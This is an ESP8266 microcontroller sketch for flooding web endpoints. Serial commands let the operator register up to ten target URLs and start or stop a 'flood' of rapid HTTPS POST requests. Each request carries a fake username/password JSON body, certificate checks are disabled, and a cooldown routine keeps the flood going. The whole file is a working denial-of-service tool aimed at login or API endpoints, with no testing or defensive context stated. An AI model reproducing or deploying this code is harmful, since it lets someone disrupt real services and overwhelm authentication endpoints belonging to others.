#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>

const char* ssid = "WiFi-NAME";
const char* password = "WiFi-PASSWORD";

const int MAX_APIS = 10;
String target_urls[MAX_APIS];
int apiCount = 0;
bool floodActive = false;
int requestCount = 0;
unsigned long startMillis = 0;
unsigned long cooldownMillis = 0;

void connectWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  Serial.print("Connecting to WiFi");
  int timeout = 20;
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(500);
    Serial.print(".");
    timeout--;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nWiFi connected.");
    Serial.print("IP: ");
    Serial.println(WiFi.localIP());
    Serial.println("Commands: url <URL>, clear, start, stop");
  } else {
    Serial.println("\nWiFi connection failed.");
  }
}

void sendFloodRequest(const String &url) {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("WiFi Disconnected");
    return;
  }
  WiFiClientSecure client;
  HTTPClient http;
  client.setInsecure();
  http.begin(client, url);
  http.addHeader("Content-Type", "application/json");
  String payload = "{\"username\":\"test2\",\"password\":\"test1\"}";
  int httpResponseCode = http.POST(payload);
  if (httpResponseCode > 0) {
    requestCount++;
    Serial.print("Req Sent | Response: ");
    Serial.println(httpResponseCode);
  } else {
    Serial.println("Request Failed");
  }
  http.end();
}

void processCommand(String command) {
  command.trim();
  if (command.startsWith("url ")) {
    if (apiCount < MAX_APIS) {
      String url = command.substring(4);
      target_urls[apiCount] = url;
      apiCount++;
      Serial.print("Added URL: ");
      Serial.println(url);
    } else {
      Serial.println("Max API limit reached");
    }
  } else if (command.equalsIgnoreCase("clear")) {
    apiCount = 0;
    Serial.println("Cleared all URLs");
  } else if (command.equalsIgnoreCase("start")) {
    if (apiCount == 0) {
      Serial.println("No URLs set. Use 'url <URL>' command.");
    } else {
      floodActive = true;
      requestCount = 0;
      startMillis = millis();
      cooldownMillis = millis();
      Serial.println("Flood Started");
    }
  } else if (command.equalsIgnoreCase("stop")) {
    floodActive = false;
    Serial.println("Flood Stopped");
  } else {
    Serial.println("Unknown command");
  }
}

void floodRequests() {
  if (millis() - cooldownMillis >= 10000) {
    if (requestCount >= 1000) {
      Serial.println("Overheating. Cooling down 5 seconds.");
      delay(5000);
    }
    requestCount = 0;
    cooldownMillis = millis();
  }
  for (int i = 0; i < apiCount; i++) {
    for (int j = 0; j < 10; j++) {
      sendFloodRequest(target_urls[i]);
      delay(1);
    }
  }
}

void setup() {
  Serial.begin(115200);
  connectWiFi();
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    processCommand(cmd);
  }
  if (floodActive) {
    floodRequests();
  }
}
